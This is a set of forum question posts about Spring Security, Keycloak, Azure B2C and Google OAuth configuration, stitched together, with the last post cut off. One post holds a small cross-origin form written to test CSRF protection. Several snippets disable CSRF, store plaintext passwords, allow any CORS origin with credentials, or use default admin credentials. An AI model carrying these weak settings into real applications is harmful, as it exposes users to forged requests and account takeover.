<p>how to write .csrf() ,.authorizeHttpRequests(),.formLogin() because it showing error that is deprecated and marked for removal.I m using springboot 3.2 version and spring security 6.2</p>
"
"<p>I have used the standard .net8 Blazor Web App template to create a Blazor server side web app with Authentication type Individual Accounts (Identity)
Interactive render mode Sever
Include Sample Pages checked</p>
<p>I then created and used a B2C tenant to register the app and added the user flow .etc stuff</p>
<p>Then per some tutorials and docs advice I  added tis to the code:</p>
<p>in appsettings.json</p>
<pre><code>    &quot;AzureAdB2C&quot;: {
      &quot;Instance&quot;: &quot;https://mydomain.b2clogin.com/tfp/&quot;,
      &quot;ClientId&quot;: &quot;********&quot;,
      &quot;ClientSecret&quot;: &quot;****&quot;,
      &quot;CallbackPath&quot;: &quot;/signin-oidc&quot;,
      &quot;SignedOutCallbackPath&quot;: &quot;/signout-oidc&quot;,
      &quot;Domain&quot;: &quot;mydomain.onmicrosoft.com&quot;,
      &quot;SignUpSignInPolicyId&quot;: &quot;B2C_1_SiginOnly&quot;
</code></pre>
<p>in Program.cs</p>
<pre><code>    builder.Services.AddAuthentication()
        .AddMicrosoftIdentityWebApp(builder.Configuration.GetSection(&quot;AzureAdB2C&quot;));

    // Configure OpenID Connect options
    builder.Services.Configure&lt;OpenIdConnectOptions&gt;(OpenIdConnectDefaults.AuthenticationScheme, options =&gt;
    {
        options.Events = new OpenIdConnectEvents
        {
            OnTokenValidated = async context =&gt;   //both
            {
                var signInManager =   context.HttpContext.RequestServices.GetRequiredService&lt;SignInManager&lt;ApplicationUser&gt;&gt;();
                var userManager = context.HttpContext.RequestServices.GetRequiredService&lt;UserManager&lt;ApplicationUser&gt;&gt;();
                var email = context.Principal.FindFirst(&quot;emails&quot;)?.Value;
                if (email != null)
                {
                    var user = await userManager.FindByEmailAsync(email);
                    if (user != null)
                    {
                        await signInManager.SignInAsync(user, isPersistent: false);
                    }
                    else
                    {
                        // User not found in local Identity system, handle accordingly
                    }
                }
                else
                {
                    // Email claim not found, handle accordingly
                }
            },
        };
    });

</code></pre>
<p>I also annotated a Blazor page with this to test the challenge:
@attribute [Authorize(Roles = &quot;Admin&quot;)]</p>
<p>After adding the b2c user and a admin role to the identity tables this actually worked very well - OR SO I THOUHGT.</p>
<p>I worked great with only one app running but when I created a second similar app to test SSO with two registered apps funny things happened like:</p>
<ol>
<li>I would launch App A and then App B</li>
<li>Then sign into App A and then App B</li>
<li>Then try to logout of App A and I would get this:
AntiforgeryValidationException: The provided antiforgery token was meant for a different claims-based user than the current user.</li>
<li>Also strange cross app things like logging into one app would would cause the other to appear un-authenticated.</li>
</ol>
<p>I believe that these issues are cookie related and are probably introduced by this line of code:
await signInManager.SignInAsync(user, isPersistent: false);</p>
<p>But I can't find a way out of this rabbit hole :(</p>
<p>I thought this would be a very desirable thing to do, use external authentication for SSO and use Core Identity to set up roles for authorization (and other stuff)</p>
<p>There are some tutorials and docs that do purport to do this but they all fall short by not actually showing the use of Identity for authenticating on directives like:
@attribute [Authorize(Roles = &quot;Admin&quot;)]
and not discussing testing using two registered apps to test SSO.</p>
<p>Has anyone got this to work successfully and/or offer advice on how to do this.</p>
<p>Thank you.</p>
<p>Testing using one registered app:
This worked perfectly</p>
<p>Testing using two registered apps:
funny things happened like:</p>
<ol>
<li>I would launch App A and then App B</li>
<li>Then sign into App A and then App B</li>
<li>Then try to logout of App A and I would get this:
AntiforgeryValidationException: The provided antiforgery token was meant for a different claims-based user than the current user.</li>
<li>Also strange cross app things like logging into one app would would cause the other to appear un-authenticated.</li>
</ol>
"
"<p>Suppose, this is my app. It has no explicit config and only one controller with one endpoint. Very simple</p>
<pre class=""lang-java prettyprint-override""><code>package com.example.securitymre.controller;

import com.example.securitymre.data.Hello;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HelloController {
    @GetMapping(&quot;/hello&quot;)
    public Hello getHello() {
        return new Hello();
    }
}
</code></pre>
<pre class=""lang-java prettyprint-override""><code>package com.example.securitymre.data;

import lombok.Getter;
import lombok.NoArgsConstructor;

@NoArgsConstructor
@Getter
public class Hello {
    private String message = &quot;Hello!&quot;;

    public Hello(String message) {
        this.message = message;
    }
}
</code></pre>
<pre class=""lang-java prettyprint-override""><code>package com.example.securitymre;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class SecurityMreApplication {

    public static void main(String[] args) {
        SpringApplication.run(SecurityMreApplication.class, args);
    }

}
</code></pre>
<p>When I try to hit <code>GET /hello</code>, I receive a 401 error which is weird since I haven't configured any security. However, I have Spring Security in my classpath</p>
<pre class=""lang-xml prettyprint-override""><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;3.2.2&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;com.example&lt;/groupId&gt;
    &lt;artifactId&gt;security-mre&lt;/artifactId&gt;
    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;name&gt;security-mre&lt;/name&gt;
    &lt;description&gt;security-mre&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;17&lt;/java.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
            &lt;optional&gt;true&lt;/optional&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;io.projectreactor&lt;/groupId&gt;
            &lt;artifactId&gt;reactor-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
            &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
                &lt;configuration&gt;
                    &lt;excludes&gt;
                        &lt;exclude&gt;
                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
                        &lt;/exclude&gt;
                    &lt;/excludes&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;

&lt;/project&gt;
</code></pre>
<p>Suppose, due to that dependency, there's some autoconfiguration that requires each request to be authenticated. But what are my requests authenticated against? I haven't configured any <code>UserDetailsService</code> that queries a database or something</p>
<p>Is there any way I can interact with a Spring Boot Security application with <strong>no explicit configuration</strong> and <strong>actually visit my endpoints</strong>? Or is it in practical terms inaccessible unless I explicitly write some configuration?</p>
"
"<p>I work on content management system, that has antMatchers like the following:</p>
<pre><code>http.authorizeRequests()
         .antMatchers(&quot;/auth/test1&quot;).hasAuthority(&quot;test1&quot;)
         .antMatchers(&quot;/auth/test1&quot;).hasAuthority(&quot;test2&quot;)
         .anyRequest().authenticated();
</code></pre>
<p>The server start and the rule works.But I need to add new rules like:</p>
<pre><code>http.authorizeRequests()
         .antMatchers(&quot;/auth/test3&quot;).hasAuthority(&quot;test3&quot;)
         .antMatchers(&quot;/auth/test4&quot;).hasAuthority(&quot;test4&quot;)
</code></pre>
<p>or I need to remove the rule of &quot;test1&quot;,just keep 'test2' like :</p>
<pre><code>http.authorizeRequests()
         .antMatchers(&quot;/auth/test1&quot;).hasAuthority(&quot;test1&quot;)
</code></pre>
<p>What can I do to meet the above requirements without restarting the server?</p>
<p>Thank you ;)</p>
<p>In SpringSecurity, I noticed if authorization is done by <code>AccessDecisionVoter#vote</code> according to the <code>AccessDecisionManager</code>, and the attributes value is derived from <code>Collection&lt; ConfigAttribute&gt;  attributes = this.obtainSecurityMetadataSource().getAttributes(object);</code>Do I need to rebuild the classes for the relevant functionality and rewrite the relevant methods? If I do that, I lose the point of using the SpringSecurity framework and hope someone can tell me about the solution, thanks.</p>
"
"<p><strong>Problem:</strong></p>
<p>I'm currently using Keycloak 15.0.1 with Spring Boot 2.7.15 within a Docker environment. Approximately six months ago, I successfully built the application, and it has been functioning as expected since then. I haven't made any changes to either the application or the Keycloak container. However, I now intend to add more functionality. When attempting to make various requests, including those to accessible endpoints, I encounter the same error consistently.</p>
<p><strong>Description of the Problem:</strong></p>
<p>Upon inspecting the Docker container logs for Keycloak, I noticed the following entry:
<a href=""https://i.stack.imgur.com/Lbh19.png"" rel=""nofollow noreferrer"">docker container logs</a></p>
<p>The error I encounter when making any request is depicted below:</p>
<ul>
<li><a href=""https://i.stack.imgur.com/6u6Iy.png"" rel=""nofollow noreferrer"">application logs</a></li>
<li><a href=""https://i.stack.imgur.com/qxiqk.png"" rel=""nofollow noreferrer"">postman request</a></li>
<li><a href=""https://i.stack.imgur.com/MFS9T.png"" rel=""nofollow noreferrer"">postman response</a></li>
</ul>
<p><strong>What I Have Tried:</strong></p>
<p>I attempted to make the request directly from Postman to Keycloak and succeeded:
<a href=""https://i.stack.imgur.com/21Ve0.png"" rel=""nofollow noreferrer"">postman</a></p>
<p>Additionally, I verified that the YAML configuration matches that of Keycloak, and it indeed matches:</p>
<pre class=""lang-yaml prettyprint-override""><code># spring config
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: http://localhost:8080/auth/realms/JCRAM

# keycloak config
keycloak:
  cors: false
  cors-allowed-methods: POST, PUT, DELETE, GET
  cors-allowed-headers: X-Requested-With, Content-Type, Authorization, Origin, Accept, Access-Control-Request-Method, Access-Control-Request-Headers, Access-Control-Allow-Origin
  realm: JCRAM
  auth-server-url: http://localhost:8080/auth
  resource: JC-client
  ssl-required: external
  credentials:
    secret: #########################
  use-resource-role-mappings: true
  policy-enforcer-config:
    http-method-as-scope: true
    paths:
      - name: insecure Resource
        path: /auth/keycloak/*
        enforcement-mode: DISABLED
  security-constraints:
    - auth-roles:
        - &quot;*&quot;
      security-collections:
        - name:
          patterns:
            - /api/v1/*
            - /api/juriste/*
            - /api/all/*
</code></pre>
<p>**For additional configuration screenshots, please let me know, and I'll provide them.
**</p>
"
"<p>From my client side, I have taken an authorization code using the <code>google.accounts.oauth2.initCodeClient()</code> with <code>ux_mode</code> set to <code>popup</code>. I would be passing the code to my server side so it could be the one making calls to the API. I'm trying to follow the following step provided by Google:</p>
<blockquote>
<p>After your backend platform receives an authorization code from Google and verifies the request, use the auth code to obtain access and refresh tokens from Google to make API calls.</p>
<p><strong>Follow the instructions</strong> starting at <a href=""https://developers.google.com/identity/protocols/oauth2/web-server#exchange-authorization-code"" rel=""nofollow noreferrer"">Step 5: Exchange authorization code for refresh and access tokens</a> of the <em>Using OAuth 2.0 for Web Server Applications</em> guide.</p>
</blockquote>
<p>But I have no idea how how to configure it.</p>
<pre><code>class GoogleAuthorizationView(APIView):

    def post(self, request):
        authoriztion_code = request.data.get(&quot;authorization_code&quot;)
        if authoriztion_code is None:
            return Response(
                {&quot;error&quot;: &quot;Please provide a valid authorization code&quot;},
                status=status.HTTP_400_BAD_REQUEST,
            )

        flow = Flow.from_client_secrets_file(
            &quot;path/to/client_secret.json&quot;,
            scopes=[
                &quot;https://www.googleapis.com/auth/userinfo.profile&quot;,
                &quot;https://www.googleapis.com/auth/userinfo.email&quot;,
                &quot;https://www.googleapis.com/auth/user.birthday.read&quot;,
            ],
            # I only added this because it's giving me error if not present.
            redirect_uri=&quot;http://127.0.0.1:8000/google-authorize/&quot;, 
        )

        flow.fetch_token(code=authoriztion_code)
        credential = flow.credentials

        print(credential)
</code></pre>
<p>This is my attempt to exchange my code to access token, but it's giving me <code>(invalid_grant) Bad request</code>. For context, I am using Django on my backend. What did I miss? Am I supposed to use <code>Flow</code>? I don't really need to redirect the user.</p>
"
"<p>The following is the implementation of <code>SecurityFilterChain</code>:</p>
<pre class=""lang-java prettyprint-override""><code>@EnableWebSecurity
@Configuration
public class WebSecurity  {
    private final UserService userDetailsService;
    private final BCryptPasswordEncoder bCryptPasswordEncoder;

    public WebSecurity(UserService userDetailsService, BCryptPasswordEncoder bCryptPasswordEncoder) {
        this.userDetailsService = userDetailsService;
        this.bCryptPasswordEncoder = bCryptPasswordEncoder;
    }

    @Bean
    public SecurityFilterChain configure(HttpSecurity http) throws Exception {
        AuthenticationManagerBuilder authenticationManagerBuilder =
                http.getSharedObject(AuthenticationManagerBuilder.class);

        authenticationManagerBuilder
                .userDetailsService(userDetailsService)
                .passwordEncoder(bCryptPasswordEncoder);

        http
            .csrf(csrf -&gt; csrf.disable())
            .authorizeRequests()
            .requestMatchers(HttpMethod.POST, &quot;/users&quot;).permitAll()
            .anyRequest().authenticated();

        return http.build();
    }
}

</code></pre>
<p>And the <code>UserService</code> implementation looks like this:</p>
<pre class=""lang-java prettyprint-override""><code>@Service
public class UserServiceImpl implements UserService {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private Utils utils;

    @Autowired
    private BCryptPasswordEncoder bCryptPasswordEncoder;

    @Override
    public UserDto createUser(UserDto userDto) {
        UserEntity exists = userRepository.findByEmail(userDto.getEmail());

        if(exists != null){
            throw new RuntimeException(&quot;Record already exists&quot; );
        }

        UserEntity userEntity = new UserEntity();
        BeanUtils.copyProperties(userDto, userEntity);

        String publicUserId = utils.generateUserId(30);
        userEntity.setUserId(publicUserId);
        userEntity.setEncryptedPassword(bCryptPasswordEncoder.encode(userDto.getPassword()));

        UserEntity storedUserEntity = userRepository.save(userEntity);

        UserDto returnValue = new UserDto();
        BeanUtils.copyProperties(storedUserEntity, returnValue);
        return returnValue;
    }

    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        UserEntity userEntity = userRepository.findByEmail(username);
        if(userEntity == null){
            throw new UsernameNotFoundException(username);
        }
        return new User(username, userEntity.getEncryptedPassword(), new ArrayList&lt;&gt;());
    }
}

</code></pre>
<p>Now, I am able to create new users via <code>/users</code> endpoint. However, if I try to create the user with existing email, then I am getting 403 error. I was expecting a error with stacktrace. Why 403?</p>
<p><a href=""https://i.stack.imgur.com/114tb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/114tb.png"" alt=""enter image description here"" /></a></p>
"
"<p>My server works on localhost and my VPN address (26.185.15.150), when I make request to http://localhost:3500/login/auth, I get correctly response and cookies. When I make request to <a href=""http://26.185.15.150:3500/login/auth"" rel=""nofollow noreferrer"">http://26.185.15.150:3500/login/auth</a>, I don't get cookies, but I get &quot;set-cookies&quot; in headers, how I need fix that?
SecurityConfig</p>
<pre class=""lang-java prettyprint-override""><code>@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .csrf(AbstractHttpConfigurer::disable)
        .authorizeHttpRequests(authorizeRequests -&gt;
                authorizeRequests
                        .requestMatchers(&quot;/login/**&quot;, &quot;/v3/**&quot;, &quot;/swagger-resources/**&quot;, &quot;/swagger-ui.html&quot;, &quot;/webjars/**&quot;, &quot;/swagger-ui/**&quot;).permitAll()
                        .requestMatchers(&quot;/image/**&quot;).permitAll()
                        .requestMatchers(&quot;/api/unsecured&quot;).permitAll()
                        .requestMatchers(&quot;/api/secured&quot;).hasAnyRole(&quot;2001&quot;, &quot;5320&quot;)
                        .requestMatchers(&quot;/api/admin&quot;).hasRole(&quot;5320&quot;)
                        .requestMatchers(&quot;/api/info&quot;).authenticated()
        )
        .sessionManagement(c -&gt; c.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .exceptionHandling(c -&gt; c.authenticationEntryPoint(new HttpStatusEntryPoint(HttpStatus.UNAUTHORIZED)))
        .addFilterBefore(jwtRequestFilter, UsernamePasswordAuthenticationFilter.class);

    return http.build();
}

@Bean
public CorsFilter corsFilter() {
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowCredentials(true);
    config.addAllowedOrigin(&quot;http://localhost:5173&quot;);
    config.addAllowedOrigin(&quot;*&quot;);
    config.addAllowedHeader(&quot;Content-Type&quot;);
    config.addAllowedHeader(&quot;Authorization&quot;);
    config.addAllowedMethod(&quot;GET&quot;);
    config.addAllowedMethod(&quot;POST&quot;);
    config.addAllowedMethod(&quot;PUT&quot;);
    config.addAllowedMethod(&quot;DELETE&quot;);
    source.registerCorsConfiguration(&quot;/**&quot;, config);

    return new CorsFilter(source);
}
</code></pre>
<p>my cookies set-up</p>
<pre class=""lang-java prettyprint-override""><code>public void setTokenCookies(HttpServletResponse response, JwtResponse jwtResponse) {
    Cookie refreshTokenCookie = new Cookie(&quot;jwt&quot;, jwtResponse.getJwtRefreshToken());
    refreshTokenCookie.setHttpOnly(true);
    refreshTokenCookie.setMaxAge((int) jwtRefreshTokenLifetime.toHours());
    refreshTokenCookie.setSecure(true);
    refreshTokenCookie.setPath(&quot;/&quot;);
    response.addCookie(refreshTokenCookie);
}
</code></pre>
<p>I excpected that my http request will correctly work with ip-address, like a localhost.</p>
"
"<p>So with my configuration, where I specify CORS but turn off CSRF protection:</p>
<pre class=""lang-java prettyprint-override""><code>@Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity) throws Exception {
        return httpSecurity
                .httpBasic(withDefaults())
                .cors(c -&gt; {
                    CorsConfigurationSource source = request -&gt; {
                        CorsConfiguration config = new CorsConfiguration();
                        config.setAllowedOrigins(List.of(&quot;http://localhost:4200&quot;));
                        config.setAllowedMethods(List.of(&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;));
                        config.setAllowedHeaders(List.of(&quot;*&quot;));
                        config.setAllowCredentials(true);
                        return config;
                    };
                    c.configurationSource(source);
                })
                .csrf(AbstractHttpConfigurer::disable)
                .authorizeHttpRequests(customizer -&gt; customizer.anyRequest().authenticated())
                .build();
    }
</code></pre>
<p>I tried to make a request with HTML form (because forms are not blocked by browser CORS) from localhost:3000 (not allowed origin):</p>
<pre class=""lang-html prettyprint-override""><code>&lt;form action=&quot;http://localhost:8080/resource&quot; method=&quot;POST&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;bad_actor@example.com&quot;&gt;
    &lt;button type=&quot;submit&quot;&gt;Submit with CSRF&lt;/button&gt;
&lt;/form&gt;
</code></pre>
<p>Expectedly Spring Security's <code>CorsFilter</code> rejects the request, and I got 403 response:</p>
<pre class=""lang-java prettyprint-override""><code>@Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
            FilterChain filterChain) throws ServletException, IOException {

        CorsConfiguration corsConfiguration = this.configSource.getCorsConfiguration(request);
        boolean isValid = this.processor.processRequest(corsConfiguration, request, response);
        if (!isValid || CorsUtils.isPreFlightRequest(request)) {
            return; // rejected here, never reaches the controller
        }
        filterChain.doFilter(request, response);
    }
</code></pre>
<p>With this in mind, why do we even bother with CSRF protection if Spring's <code>CorsFilter</code> will anyways block it?</p>
"
"<p>I am developing a website(SPA) using <code>Vue.js</code> and <code>Spring Boot</code> based on the <code>BFF</code> tutorial provided from <a href=""https://github.com/ch4mpy/spring-addons/tree/master/samples/tutorials/bff"" rel=""nofollow noreferrer"">spring-addons</a>.</p>
<p>At some point I needed to optimize the development process, I came to the conclusion that the reverse proxy server (bff gateway) would not change often during development and it was time to stop running it manually from the IDEA. Therefore, need to package it into a <code>docker image</code> and run it through <code>docker-compose</code> along with other services (keycloak and postgresql). Trying to do this, I ran into certain problems that I do not know how to solve.</p>
<p>When launching <code>bff-gateway</code> from <code>docker</code> and trying to log in to <code>keycloak</code>, as expected according to the tutorial, a request is made to <code>http://localhost:8080/oauth2/authorization/keycloak</code></p>
<p>The response to the request is 304 redirect to location: <code>http://keycloak:9090/realms/...</code> which leads to &quot;Unable to access the site&quot;</p>
<p>How should I configure this correctly so that it works as it should?</p>
<p><code>docker-compose.yaml</code>:</p>
<pre class=""lang-yaml prettyprint-override""><code>services:
  gateway:
    image: 'bff-gateway:0.0.1-SNAPSHOT'
    container_name: 'bff'
    environment:
      SPRING_PROFILES_ACTIVE: 'prod-docker'
    networks:
      - 'keycloak-network'
    ports:
      - '8080:8080'
    depends_on:
      keycloak:
        condition: 'service_healthy'
  postgres:
    image: 'postgres:latest'
    container_name: 'postgres-db'
    restart: 'always'
    volumes:
      - postgres_data:/var/lib/postgresql/data
    environment:
      POSTGRES_DB: 'keycloakdb'
      POSTGRES_USER: 'keycloakuser'
      POSTGRES_PASSWORD: 'keycloakpass'
    networks:
      - 'keycloak-network'
    healthcheck:
      test: pg_isready -U keycloakuser -d keycloakdb
      interval: 10s
      timeout: 3s
      retries: 3
      start_period: 5s
  keycloak:
    container_name: 'keycloak'
    image: quay.io/keycloak/keycloak:23.0.4
    restart: 'always'
    volumes:
      - keycloak_data:/opt/keycloak/data/
    environment:
      KC_HEALTH_ENABLED: true
      DB_VENDOR: 'POSTGRES'
      DB_ADDR: 'postgres'
      DB_DATABASE: 'keycloakdb'
      DB_SCHEMA: 'public'
      KEYCLOAK_USER: 'user'
      KEYCLOAK_PASSWORD: 'user'
      KEYCLOAK_ADMIN: 'admin'
      KEYCLOAK_ADMIN_PASSWORD: 'admin'
    ports:
      - &quot;9090:9090&quot;
    command:
      - &quot;start-dev&quot;
      - &quot;--http-port=9090&quot;
    networks:
      - 'keycloak-network'
    depends_on:
      postgres:
        condition: 'service_healthy'
    healthcheck:
      # I have not found another way to do this, if you know, then please help: https://devops.stackexchange.com/q/18923/43435
      test: [ 'CMD-SHELL', '[ -f /tmp/HealthCheck.java ] || echo &quot;public class HealthCheck { public static void main(String[] args) throws java.lang.Throwable { System.exit(java.net.HttpURLConnection.HTTP_OK == ((java.net.HttpURLConnection) java.net.URI.create(args[0]).toURL().openConnection()).getResponseCode() ? 0 : 1); } }&quot; &gt; /tmp/HealthCheck.java &amp;&amp; java /tmp/HealthCheck.java http://localhost:9090/health/live' ]
      start_period: 10s
      interval: 15s
      retries: 3
      timeout: 5s

networks:
  keycloak-network:
    driver: 'bridge'

volumes:
  postgres_data:
    driver: 'local'
  keycloak_data:
    driver: 'local'
</code></pre>
<p>bff-gateway <code>prod-docker</code> profile:</p>
<pre class=""lang-yaml prettyprint-override""><code>issuer: http://keycloak:9090/realms/realm-id
# At the time of development, the common frontend and backend application is launched from IDEA
backend-api-uri: ${scheme}://host.docker.internal:8090/api
ui-uri: ${scheme}://host.docker.internal:1000
</code></pre>
<p>Base configuration of bff-gateway corresponds to the <a href=""https://github.com/ch4mpy/spring-addons/blob/master/samples/tutorials/bff/backend/with-c4-soft/bff-c4/src/main/resources/application.yml"" rel=""nofollow noreferrer"">tutorial</a>.</p>
"
"<p>&quot;localhost redirected you too many times&quot; opening custom Spring Security login page</p>
<p>java 19, spring webmvc 6.0.13, spring security 6.0.8</p>
<p>security config page:</p>
<pre><code>@Configuration
@EnableWebSecurity(debug = true)
public class ServicePlatformSecurityConfig {

    @Bean
    UserDetailsManager users(DataSource dataSource) {
        JdbcUserDetailsManager users = new JdbcUserDetailsManager(dataSource);
        return users;
    }
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http, HandlerMappingIntrospector introspector) throws Exception {
        MvcRequestMatcher.Builder builder = new MvcRequestMatcher.Builder(introspector);
        http
                .authorizeHttpRequests((authorizeRequests) -&gt; authorizeRequests
                .requestMatchers(builder.pattern(&quot;/WEB-INF/view/**&quot;)).permitAll()
                .requestMatchers(builder.pattern(&quot;/login&quot;)).permitAll()
                .requestMatchers(builder.pattern(&quot;/**&quot;)).hasRole(&quot;USER&quot;)
                .anyRequest().authenticated()
            )
                .formLogin(form -&gt; form
                        .loginPage(&quot;/login&quot;)
                        .permitAll());
        
        return http.build();
    }
}
</code></pre>
<p>controller for login:</p>
<pre><code>@Controller
class LoginController {
    @GetMapping(&quot;/login&quot;)
    
    String login() {
        System.out.println(&quot;debug&quot;);
        return &quot;login&quot;;
    }
}
</code></pre>
<p><a href=""https://i.stack.imgur.com/5vbks.png"" rel=""nofollow noreferrer"">file structure for jsp views:</a></p>
<p>Eventually I want to restrict authentication to certain endpoints. But for right now, I'm simply trying to get redirected to my custom login page when going to any url in my app. Instead I get a browser error &quot;localhost redirected you too many times.&quot; It works with default login.</p>
"
"<p>This is my SecurityConfiguration file
@EnableWebSecurity
public class SecurityConfiguration   {</p>
<pre><code>@Autowired
private DataSource datasource;

@Bean
    public DataSource dataSource(){
    return new EmbeddedDatabaseBuilder()
            .setType(H2)
            .addScript(JdbcDaoImpl.DEFAULT_USER_SCHEMA_DDL_LOCATION)
            .build();
}


protected void configure(AuthenticationManagerBuilder auth) throws Exception{
    auth.jdbcAuthentication().dataSource(datasource).passwordEncoder(NoOpPasswordEncoder.getInstance());
}

public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception{
    return http.authorizeHttpRequests((authorize) -&gt; authorize
                    .requestMatchers(&quot;/user&quot;).hasRole(&quot;USER&quot;) // User
                    .requestMatchers(&quot;/admin&quot;,&quot;/user&quot; ).hasRole(&quot;ADMIN&quot;) // Combined rule for admin access
                    .anyRequest().authenticated()) // Authentication for remaining requests
            .httpBasic(Customizer.withDefaults())
            .formLogin(Customizer.withDefaults())
            .build();
}
</code></pre>
<p>}</p>
<p>This is my data.sql file INSERT INTO users(username, password,enabled)
values('user','pass',true);</p>
<p>INSERT INTO users(username, password,enabled)
values('admin','pass',true);</p>
<p>INSERT INTO authorities(username,authority)
values('user','ROLE_USER');</p>
<p>INSERT INTO authorities(username,authority)
values('admin','ROLE_ADMIN');</p>
<p>This is my schema
create table users(
username varchar_ignorecase(50) not null primary key,
password varchar_ignorecase(500) not null,
enabled boolean not null
);</p>
<p>create table authorities (
username varchar_ignorecase(50) not null,
authority varchar_ignorecase(50) not null,
constraint fk_authorities_users foreign key(username) references users(username)
);
create unique index ix_auth_username on authorities (username,authority);</p>
<p>i am new to this can anyone please help me with this</p>
"
"<p>Locally I can make my registration request, however when I use the domain of my application on Railway it gives a 403</p>
<p><strong>Here is my security config:</strong></p>
<pre><code>@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Autowired
    private SecurityFilter securityFilter;

    @Autowired
    private CustomUserDetailsService customUserDetailsService;

    @Autowired
    private AuthEntryPointJwt unauthorizedHandler;

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity) throws Exception {

        return httpSecurity.csrf(csrf -&gt; csrf.disable()).cors(cors -&gt; cors.disable())
                
                .exceptionHandling(exception -&gt; exception.authenticationEntryPoint(unauthorizedHandler))

                .headers(headers -&gt; headers.frameOptions(frameOptions -&gt; frameOptions.disable()))

                .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))

                .authorizeHttpRequests(authorize -&gt; authorize.requestMatchers(&quot;/h2-console/**&quot;).permitAll()

                        .requestMatchers(HttpMethod.POST, &quot;/api/pessoafisica/login&quot;, &quot;/api/pessoafisica/register&quot;)
                        .permitAll()
                        .requestMatchers(HttpMethod.POST, &quot;/api/pessoajuridica/login&quot;, &quot;/api/pessoajuridica/register&quot;)
                        .permitAll().requestMatchers(HttpMethod.DELETE, &quot;/api/pessoafisica/{id}&quot;).hasRole(&quot;ADMIN&quot;)
                        .anyRequest().authenticated())
                .addFilterBefore(securityFilter, UsernamePasswordAuthenticationFilter.class).build();
    }

    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration authenticationConfiguration)
            throws Exception {
        return authenticationConfiguration.getAuthenticationManager();
    }

    @Bean
    public PasswordEncoder passwordEnconder() {
        return new BCryptPasswordEncoder();
    }

    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
        auth.userDetailsService(customUserDetailsService).passwordEncoder(passwordEnconder());
    }

}

</code></pre>
<p><img src=""https://i.stack.imgur.com/n4foS.png"" alt=""Enter Image Description Here"" /></p>
<p>Simply the implementation in Railway does not accept my registration post.</p>
"
"<p>This is the code snippet of my authorization server which is running on spring boot 2.2.4 and running on port 7220. I can get the access token by calling this API call http://localhost:7220/oauth/token</p>
<pre><code>&lt;?xml&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;2.2.4.RELEASE&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
